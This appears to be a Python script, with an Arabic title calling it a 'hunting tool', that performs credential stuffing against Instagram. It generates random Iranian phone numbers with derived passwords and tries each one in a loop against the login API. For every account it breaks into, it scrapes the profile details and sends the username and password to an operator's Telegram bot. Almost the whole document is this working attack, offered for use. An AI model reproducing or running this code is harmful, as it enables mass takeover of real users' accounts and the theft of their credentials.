# Cvvx
اداة صيد بمعلومات🦦
import webbrowser, random, requests, user_agent, json

from secrets import token_hex

import secrets, sys, uuid

from uuid import uuid4

from time import sleep

import webbrowser, time, webbrowser

E = '\x1b[1;31m'

G = '\x1b[1;32m'

S = '\x1b[1;33m'

Z = '\x1b[1;31m'

X = '\x1b[1;33m'

Z1 = '\x1b[2;31m'

F = '\x1b[2;32m'

A = '\x1b[2;39m'

C = '\x1b[2;35m'

B = '\x1b[2;36m'

Y = '\x1b[1;34m'

Z2 = '\x1b[1;31m'

X = '\x1b[1;33m'

Z1 = '\x1b[2;31m'

F = '\x1b[2;32m'

A = '\x1b[2;39m'

C = '\x1b[2;35m'

aa = 0

zz = 0

print(B + '_____________________________________________')

logo = ("""    _    _     _     

   / \  | |___| |__  

  / _ \ | / __| '_ \ 

 / ___ \| \__ \ | | |

/_/   \_\_|___/_| |_|""")

print(S+logo)

print(B + '_____________________________________________')

print(C + '\n⌯ 1  رقم صيد حلو  \n\n⌯ 2 رقم صيد قوي\n\n⌯ 3  رقم هم قوي  ')

print(F + '_____________________________________________')

Extra = input(B + '  ⌯ اختار رقم :  ')

extra2 = input(B + '  ⌯ توكن حب  :  ')

extra1 = input(B + '  ⌯ ايدي حب  : ')

print(F + '_____________________________________________')

import time

t = time.localtime()

current_time = time.strftime('%A:%b:%S', t)

start_msg = requests.post(f"https://api.telegram.org/bot{extra2}/sendMessage?chat_id={extra1}&text= سني تاج راسك⚔️").json()

id_msg = start_msg['result']['message_id']

def code_EXTRA(userI, password):

    cookie = secrets.token_hex(5) * 2

    head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 

     'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 

     'Cookie':'cookie', 

     'Accept':'*/*', 

     'ContentType':'application/x-www-form-urlencoded', 

     'X-Requested-With':'XMLHttpRequest', 

     'X-IG-App-ID':'936619743392459', 

     'X-Instagram-AJAX':'missing', 

     'X-CSRFToken':'missing', 

     'Accept-Language':'en-US,en;q=0.9'}

    url_id = f"https://www.instagram.com/{userI}/?__a=1"

    req_id = requests.get(url_id, headers=head).json()

    name = str(req_id['graphql']['user']['full_name'])

    id = str(req_id['graphql']['user']['id'])

    followes = str(req_id['graphql']['user']['edge_followed_by']['count'])

    following = str(req_id['graphql']['user']['edge_follow']['count'])

    isp = str(req_id['graphql']['user']['is_private'])

    idd = str(req_id['graphql']['user']['id'])

    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")

    ree = re.json()

    dat = ree['data']

    eXtra = B + f"\n\nتعال جبتلك ايراني 💊: \n____________________\n⌯ الاسمسم🤤 : {name} .\n⌯ اليوزر🎭 : {userI} .\n⌯ الباسورد📌 : {password} .\n⌯ المتابعين✔️ : {followes} .\n⌯ الي متابعهم🔴 : {following} .\n⌯ انشاء🙄 : {dat} .\n_____________________\n علش(@gftali)\n "

    tlg = f"https://api.telegram.org/bot{extra2}/sendMessage?chat_id={extra1}&text={eXtra}"

    i = requests.post(tlg)

    print(G + eXtra)

url = 'https://i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)',  'Accept':'*/*', 

 'Cookie':'missing', 

 'Accept-Encoding':'gzip, deflate', 

 'Accept-Language':'en-US', 

 'X-IG-Capabilities':'3brTvw==', 

 'X-IG-Connection-Type':'WIFI', 

 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

 'Host':'i.instagram.com'}

user = '9087654321'

while True:

    if Extra == '1':

        us = str(''.join((random.choice(user) for i in range(6))))

        username = '+98937' + us

        password = '0937' + us

    if Extra == '2':

        us = str(''.join((random.choice(user) for i in range(5))))

        username = '+98936' + us

        password = '0936' + us

    if Extra == '3':

        us = str(''.join((random.choice(user) for i in range(5))))

        username = '+98914' + us

        password = '0914' + us

    uid = str(uuid4())

    data = {'uuid':uid,  'password':password, 

     'username':username, 

     'device_id':uid, 

     'from_reg':'false', 

     '_csrftoken':'missing', 

     'login_attempt_countn':'0'}

    req = requests.post(url, headers=headers, data=data)

    if 'logged_in_user' in req.json():

        zz += 1

        userQ = req.json()['logged_in_user']['username']

        code_EXTRA(userQ, password)

    elif '"message":"challenge_required","challenge"' in req.json():

        print(S + 'username : ' + username + ': password : ' + password)

    else:

        requests.post(f"https://api.telegram.org/bot{extra2}/editmessagetext?chat_id={extra1}&message_id={id_msg}&text=⌯  JHENM  : .\n .  . \n ⌯ حساب شغال [{zz}]\n                        \n⌯ حساب مو شغال [{aa}] \n.  .\n⌯ Ch : @gftali  ")

        print(E + 'username : ' + username + ': password : ' + password)

        aa += 1

